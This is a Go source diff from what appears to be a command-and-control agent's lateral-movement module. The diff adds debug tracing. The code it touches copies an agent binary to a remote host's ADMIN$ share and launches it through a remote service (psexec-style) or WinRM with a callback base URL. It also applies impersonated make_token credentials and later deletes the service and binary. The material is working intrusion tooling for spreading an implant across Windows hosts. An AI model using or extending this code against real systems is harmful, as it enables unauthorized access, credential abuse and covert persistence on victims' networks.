@@ -86,10 +86,14 @@ func lateralMoveWithProgress(payload lateralPayload, publish func(string)) (stri
 		return "", err
 	}
 	localPath := `C:\Windows\System32\` + binaryName
-	agentCommand := lateralAgentCommand(localPath, targetSession, payload.WorkspaceID, serviceName)
+	agentCommand := lateralAgentCommand(localPath, targetSession, payload.WorkspaceID, serviceName, payload.Debug)
 
 	if payload.Method == "psexec" {
 		return lateralPsexecMove(payload, targetSession, serviceName, binaryName, publish)
+	}
+	self, err = resolveDebugAgentExecutable(self, payload.Debug)
+	if err != nil {
+		return "", err
 	}
 
 	// Stage the agent binary through ADMIN$ (SMB write under the active
@@ -105,7 +109,7 @@ func lateralMoveWithProgress(payload lateralPayload, publish func(string)) (stri
 			return "", err
 		}
 	case "winrm":
-		if err := winrmCreateProcess(payload.Host, localPath, targetSession, payload.WorkspaceID, serviceName); err != nil {
+		if err := winrmCreateProcess(payload.Host, localPath, targetSession, payload.WorkspaceID, serviceName, payload.Debug); err != nil {
 			return "", err
 		}
 	}
@@ -135,7 +139,7 @@ func lateralPsexecMove(payload lateralPayload, targetSession, serviceName, binar
 		return "", fmt.Errorf("stage lateral service on %s: %w", payload.Host, err)
 	}
 	localPath := `C:\Windows\System32\` + binaryName
-	binPath := fmt.Sprintf(`%s --stage %s --session %s --base-url %s`, localPath, payload.Stage, targetSession, buildWindowsCmdLine([]string{cfg.BaseURL}))
+	binPath := buildWindowsCmdLine(append([]string{localPath}, lateralServiceArguments(payload.Stage, targetSession, cfg.BaseURL, payload.Debug)...))
 	// The service is not marked for deletion here; this caller removes it
 	// below once the linked worker has completed successfully.
 	if err := scmStartService(payload.Host, serviceName, binPath, false); err != nil {
@@ -167,6 +171,7 @@ func lateralPsexecMove(payload lateralPayload, targetSession, serviceName, binar
 // waitStage1Stopped observes only this deployment's service, never another agent.
 // A successful service exit means stage1 created the new agent process.
 func waitStage1Stopped(host, name string, timeout time.Duration) error {
+	debugEvent("scm.wait_stopped.begin", nil)
 	var machine *uint16
 	if host != "" {
 		pointer, err := syscall.UTF16PtrFromString(`\\` + host)
@@ -175,32 +180,43 @@ func waitStage1Stopped(host, name string, timeout time.Duration) error {
 		}
 		machine = pointer
 	}
+	debugEvent("scm.wait.open_manager.begin", nil)
 	scm, _, callErr := procOpenSCManagerW.Call(uintptr(unsafe.Pointer(machine)), 0, 1)
 	if scm == 0 {
+		debugEvent("scm.wait.open_manager.failed", callErr)
 		return fmt.Errorf("open SC manager on %s: %w", host, callErr)
 	}
+	debugEvent("scm.wait.open_manager.complete", nil)
 	defer procCloseServiceHandle.Call(scm)
 	serviceName, err := syscall.UTF16PtrFromString(name)
 	if err != nil {
 		return err
 	}
+	debugEvent("scm.wait.open_service.begin", nil)
 	service, _, callErr := procOpenServiceW.Call(scm, uintptr(unsafe.Pointer(serviceName)), 4)
 	if service == 0 {
+		debugEvent("scm.wait.open_service.failed", callErr)
 		return serviceLookupOutcome(callErr)
 	}
+	debugEvent("scm.wait.open_service.complete", nil)
 	defer procCloseServiceHandle.Call(service)
 	deadline := time.Now().Add(timeout)
 	for {
 		var status struct{ serviceType, state, accepted, exitCode, specificCode, checkpoint, waitHint uint32 }
+		debugEvent("scm.wait.query_status.begin", nil)
 		ok, _, queryErr := procQueryServiceStatus.Call(service, uintptr(unsafe.Pointer(&status)))
 		if ok == 0 {
+			debugEvent("scm.wait.query_status.failed", queryErr)
 			return fmt.Errorf("query launcher service: %w", queryErr)
 		}
+		debugEvent("scm.wait.query_status.complete", nil)
 		ready, err := launcherServiceOutcome(status.state, status.exitCode, status.specificCode)
 		if err != nil || ready {
+			debugEvent("scm.wait_stopped.complete", err)
 			return err
 		}
 		if !time.Now().Before(deadline) {
+			debugEvent("scm.wait_stopped.timeout", context.DeadlineExceeded)
 			return errors.New("launcher service has not stopped; cleanup pending")
 		}
 		time.Sleep(100 * time.Millisecond)
@@ -262,6 +278,7 @@ func scmStartService(host, serviceName, binPath string, markForDeletion bool) er
 // scmDeleteService removes a service on the target host; a missing service
 // is reported as already removed.
 func scmDeleteService(host, serviceName string) (bool, error) {
+	debugEvent("scm.delete.begin", nil)
 	var machinePtr *uint16
 	if host != "" {
 		pointer, err := syscall.UTF16PtrFromString(`\\` + host)
@@ -271,24 +288,49 @@ func scmDeleteService(host, serviceName string) (bool, error) {
 		machinePtr = pointer
 	}
 	// Convert inside Call so Go retains the hostname for the native call.
+	debugEvent("scm.delete.open_manager.begin", nil)
 	scm, _, callErr := procOpenSCManagerW.Call(uintptr(unsafe.Pointer(machinePtr)), 0, scManagerAllAccess)
 	if scm == 0 {
+		debugEvent("scm.delete.open_manager.failed", callErr)
 		return false, fmt.Errorf("open SC manager on %s: %w", host, callErr)
 	}
-	defer procCloseServiceHandle.Call(scm)
+	debugEvent("scm.delete.open_manager.complete", nil)
+	defer func() {
+		debugEvent("scm.delete.close_manager.begin", nil)
+		ok, _, closeErr := procCloseServiceHandle.Call(scm)
+		if ok == 0 {
+			debugEvent("scm.delete.close_manager.failed", closeErr)
+		} else {
+			debugEvent("scm.delete.close_manager.complete", nil)
+		}
+	}()
 	namePtr, err := syscall.UTF16PtrFromString(serviceName)
 	if err != nil {
 		return false, fmt.Errorf("encode service name: %w", err)
 	}
+	debugEvent("scm.delete.open_service.begin", nil)
 	service, _, callErr := procOpenServiceW.Call(scm, uintptr(unsafe.Pointer(namePtr)), serviceAllAccess)
 	if service == 0 {
+		debugEvent("scm.delete.open_service.failed", callErr)
 		return false, serviceLookupOutcome(callErr)
 	}
-	defer procCloseServiceHandle.Call(service)
+	debugEvent("scm.delete.open_service.complete", nil)
+	defer func() {
+		debugEvent("scm.delete.close_service.begin", nil)
+		ok, _, closeErr := procCloseServiceHandle.Call(service)
+		if ok == 0 {
+			debugEvent("scm.delete.close_service.failed", closeErr)
+		} else {
+			debugEvent("scm.delete.close_service.complete", nil)
+		}
+	}()
+	debugEvent("scm.delete_service.begin", nil)
 	deleted, _, callErr := procDeleteServiceW.Call(service)
 	if deleted == 0 {
+		debugEvent("scm.delete_service.failed", callErr)
 		return false, fmt.Errorf("delete service on %s: %w", host, callErr)
 	}
+	debugEvent("scm.delete_service.complete", nil)
 	return true, nil
 }
 
@@ -336,6 +378,7 @@ func runLateralCleanupChild(args []string) error {
 // binary on the target. It first waits for the linked stage1 worker to
 // finish, so a still-running deployment is never deleted underneath itself.
 func lateralCleanup(payload lateralCleanupPayload) (string, error) {
+	debugEvent("lateral.cleanup.begin", nil)
 	if err := waitStage1Stopped(payload.Host, payload.ServiceName, 15*time.Second); err != nil {
 		var failed *launcherFailure
 		if !errors.As(err, &failed) {
@@ -343,8 +386,11 @@ func lateralCleanup(payload lateralCleanupPayload) (string, error) {
 		}
 	}
 	serviceDeleted, serviceErr := scmDeleteService(payload.Host, payload.ServiceName)
+	debugEvent("lateral.cleanup.service_delete.returned", serviceErr)
 	sharePath := `\\` + payload.Host + `\ADMIN$\System32\` + payload.BinaryName
+	debugEvent("lateral.cleanup.remove_file.begin", nil)
 	fileErr := removeStoppedLauncher(sharePath)
+	debugEvent("lateral.cleanup.remove_file.returned", fileErr)
 	var detail strings.Builder
 	if serviceErr != nil {
 		fmt.Fprintf(&detail, "service error (%v)", serviceErr)
@@ -362,6 +408,7 @@ func lateralCleanup(payload lateralCleanupPayload) (string, error) {
 		fmt.Fprintf(&detail, "; launcher binary still on ADMIN$ (%v)", fileErr)
 	}
 	output, err := lateralCleanupOutcome(detail.String(), serviceErr, fileErr)
+	debugEvent("lateral.cleanup.complete", err)
 	if err == nil {
 		lateralCleanupOwners.Lock()
 		delete(lateralCleanupOwners.artifacts, payload)
@@ -395,18 +442,23 @@ func lateralPsexecGoroutine(ctx context.Context, payload lateralPayload) (string
 	progress := make(chan string, 1)
 	go func() {
 		runtime.LockOSThread()
+		debugEvent("lateral.worker.start", nil)
 		defer func() {
+			debugEvent("lateral.worker.revert_identity.begin", nil)
 			if ok, _, err := procRevertToSelf.Call(); ok == 0 {
 				identityBoundaryFailure(fmt.Errorf("clear worker thread token: %w", err))
 				// Exiting while pinned makes the Go runtime discard this thread.
 				return
 			}
+			debugEvent("lateral.worker.revert_identity.complete", nil)
 			runtime.UnlockOSThread()
+			debugEvent("lateral.worker.stop", nil)
 		}()
 		// Apply the active make_token credentials to this goroutine's OS thread.
 		// This is a no-op when no token is active, so psexec still works under
 		// the agent's own identity.
 		reestablishThreadToken()
+		debugEvent("lateral.worker.apply_identity.returned", nil)
 		if identityBoundaryFault.Load() {
 			ch <- lateralResult{"", errIdentityUnsafe}
 			return
